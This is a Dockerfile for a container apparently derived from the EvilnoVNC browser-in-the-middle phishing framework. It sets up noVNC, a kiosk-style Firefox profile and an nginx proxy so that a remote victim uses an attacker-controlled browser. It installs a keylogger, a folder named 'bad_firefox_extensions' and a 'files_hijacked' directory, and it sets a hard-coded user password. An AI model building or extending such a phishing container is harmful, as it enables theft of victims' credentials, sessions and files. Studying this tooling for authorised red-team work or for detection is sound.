# VNC container workflow adapted from JoelGMSec/EvilnoVNC:
# https://github.com/JoelGMSec/EvilnoVNC
# EvilnoVNC is licensed under the GNU General Public License version 3.
# Modified by P-BitM, 2026.

FROM debian:bookworm-slim

# Install base packages
RUN apt-get update && \
    DEBIAN_FRONTEND=noninteractive apt-get install -y \
    adduser dbus-x11 procps zip \
    firefox-esr git curl python3 python3-pip jq python3-tk python3-dev gnome-screenshot \
    openbox tigervnc-standalone-server autocutsel nginx && \
    rm -rf /var/lib/apt/lists/*

# Setting python3
RUN ln -s /usr/bin/python3 /usr/bin/python

# Setup dbus
RUN dbus-uuidgen > /var/lib/dbus/machine-id

# Use the same numeric identity as every service that writes shared storage.
RUN groupadd --gid 1000 bitm && \
    useradd --uid 1000 --gid bitm --create-home --shell /bin/bash bitm && \
    echo 'bitm:bitm' | chpasswd

# Install Python runtime dependencies system-wide. The container entrypoint
# starts as root for its one-time configuration, while supervisord later drops
# desktop processes to `bitm`; both users must resolve the same modules.
RUN python3 -m pip install \
    websockify numpy pyxdg supervisor pynput websocket_server \
    --break-system-packages --no-cache-dir

# Prepare the application directory before dropping build privileges.
RUN install -d -m 0755 -o bitm -g bitm /bitm /bitm/app
WORKDIR /bitm
USER bitm

# Install noVNC
RUN git clone --branch v1.7.0 --depth 1 https://github.com/novnc/noVNC.git /bitm/app/noVNC && \
    sed -i 's/qualityLevel = 6/qualityLevel = 9/' /bitm/app/noVNC/core/rfb.js && \
    sed -i 's/compressionLevel = 2/compressionLevel = 0/' /bitm/app/noVNC/core/rfb.js && \
    sed -i '/encodings = \[/a\ \ \ \ rfb.encodings.raw,' /bitm/app/noVNC/core/rfb.js

# Copy all necessary files
COPY vnc/scripts/startVNC.sh /bitm/app/startVNC.sh
COPY vnc/scripts/startFirefox.sh /bitm/app/startFirefox.sh
COPY vnc/conf/novnc.html /bitm/app/noVNC/index.html
COPY vnc/conf/openbox.xml /home/bitm/.config/openbox/rc.xml
COPY vnc/conf/supervisord.conf /etc/supervisor/conf.d/supervisord.conf

# Essentials tools
COPY common/keylogger /bitm/app/keylogger
RUN mkdir -p /bitm/app/bad_firefox_extensions
COPY common/firefox/bad_firefox_extensions /bitm/app/bad_firefox_extensions
RUN mkdir /bitm/app/files_hijacked

# Firefox configuration
RUN mkdir -p /bitm/.mozilla/firefox/bitm-profile
RUN mkdir -p /bitm/.mozilla/firefox/default
COPY common/firefox/policies.json /etc/firefox/policies/policies.json.prod
COPY common/firefox/policies.json.dev /etc/firefox/policies/policies.json.dev
COPY common/firefox/firefox.ini /bitm/.mozilla/firefox/profiles.ini
COPY common/firefox/firefox.js /bitm/.mozilla/firefox/bitm-profile/user.js
COPY common/firefox/firefox.css /bitm/.mozilla/firefox/bitm-profile/chrome/userChrome.css

# COPY certs/cert.pem /bitm/app/certs/cert.pem
# COPY certs/key.pem /bitm/app/certs/key.pem

# 🔥 NGINX LOCAL PROXY CONFIG
COPY vnc/conf/nginx.conf /etc/nginx/conf.d/local-proxy.conf

# The entrypoint performs root-only configuration, then supervisord drops to
# the unprivileged browser user for every desktop process.
USER root
RUN chmod +x /bitm/app/startVNC.sh /bitm/app/startFirefox.sh && \
    chown -R bitm:bitm /bitm /home/bitm

ENTRYPOINT ["/bin/bash", "-c", "/bitm/app/startVNC.sh"]
